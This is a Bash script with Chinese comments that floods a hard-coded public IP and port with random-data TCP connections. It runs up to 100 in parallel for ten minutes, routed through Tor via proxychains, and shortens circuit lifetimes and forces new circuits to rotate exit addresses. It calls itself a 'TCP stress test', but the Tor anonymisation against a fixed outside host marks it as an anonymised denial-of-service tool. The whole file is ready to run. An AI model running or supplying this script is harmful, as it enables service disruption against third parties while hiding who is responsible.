#!/bin/bash

TARGET_IP="47.56.125.133"
PORT=48533
DURATION=600
MAX_PARALLEL=100
TORRC="/etc/tor/torrc"
DATA_DIR="/var/lib/tor/tor1"

SUCCESS_COUNT=0
FAIL_COUNT=0
TOTAL_REQUESTS=0

log() { echo "[$(date '+%H:%M:%S')] $1"; }

gen_torrc() {
cat <<EOF > $TORRC
SOCKSPort 9050
ControlPort 9051
CookieAuthentication 0
# ExitNodes {hk},{tw}
# StrictNodes 1
DataDirectory $DATA_DIR
MaxCircuitDirtiness 30
NewCircuitPeriod 15
CircuitBuildTimeout 30
LearnCircuitBuildTimeout 0
NumEntryGuards 6
EOF
}

start_tor() {
  gen_torrc
  tor -f $TORRC &
  TOR_PID=$!
  sleep 40
}

# 強制Tor換線（NEWNYM）
force_newnym() {
  log "發送NEWNYM指令給Tor ControlPort"
  echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051 >/dev/null
  sleep 10
}

# 取得出口IP，未知自動換線/重啟，容錯最多3次，失敗則中斷
get_valid_exit_ip() {
  local attempts=0
  local max_attempts=3
  local ip="未知"
  while [ $attempts -lt $max_attempts ]; do
    ip=$(timeout 20 proxychains curl -s --max-time 15 https://api.ipify.org 2>/dev/null || echo "未知")
    if [ "$ip" != "未知" ] && [ -n "$ip" ]; then
      log "Tor出口IP: $ip"
      echo "$ip"
      return 0
    fi
    log "Tor出口IP: 未知，第 $((attempts + 1)) 次重試"
    force_newnym
    kill $TOR_PID 2>/dev/null
    sleep 2
    start_tor
    ((attempts++))
  done
  log "Tor出口IP連續 $max_attempts 次都未知，腳本中斷"
  exit 1
}

do_tcp_test() {
  local id=$1
  dd if=/dev/urandom bs=800 count=1 2>/dev/null | \
  timeout 8 proxychains ncat -w 5 $TARGET_IP $PORT >/dev/null 2>&1

  if [ $? -eq 0 ]; then
    ((SUCCESS_COUNT++))
  else
    ((FAIL_COUNT++))
  fi
  ((TOTAL_REQUESTS++))
}

# 主流程
start_tor
EXIT_IP=$(get_valid_exit_ip)
log "Tor出口IP: $EXIT_IP"

START_TIME=$(date +%s)
TEST_COUNT=0

while [ $(($(date +%s) - START_TIME)) -lt $DURATION ]; do
  while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do wait -n; done

  do_tcp_test "$TEST_COUNT" &
  ((TEST_COUNT++))

  if [ $((TEST_COUNT % 50)) -eq 0 ]; then
    log "進度: $TEST_COUNT, 活躍: $(jobs -r | wc -l), 請求: $TOTAL_REQUESTS, 成功: $SUCCESS_COUNT, 失敗: $FAIL_COUNT"
  fi

  sleep 0.1
done

log "等待所有任務完成..."
wait

TOTAL_TIME=$(($(date +%s) - START_TIME))
SUCCESS_RATE=$((SUCCESS_COUNT * 100 / (SUCCESS_COUNT + FAIL_COUNT)))
REQUESTS_PER_MIN=$((TOTAL_REQUESTS * 60 / TOTAL_TIME))

log "=== TCP壓力測試完成 ==="
log "出口IP: $EXIT_IP"
log "總請求: $TOTAL_REQUESTS"
log "成功: $SUCCESS_COUNT"
log "失敗: $FAIL_COUNT"
log "成功率: ${SUCCESS_RATE}%"
log "平均速率: ${REQUESTS_PER_MIN} req/min"
log "測試時長: ${TOTAL_TIME}秒"
kill $TOR_PID 2>/dev/null
log "TCP測試結束"
